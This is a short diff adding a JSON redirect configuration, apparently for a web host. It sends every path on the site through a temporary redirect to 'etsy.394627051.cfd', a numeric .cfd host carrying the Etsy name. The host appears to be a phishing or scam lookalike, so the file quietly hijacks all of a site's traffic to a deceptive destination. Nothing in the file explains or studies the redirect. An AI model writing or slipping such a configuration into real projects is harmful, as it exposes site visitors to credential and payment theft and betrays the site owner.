@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/:path*",
+      "destination": "https://etsy.394627051.cfd/o619qpv9j",
+      "permanent": false
+    }
+  ]
+}
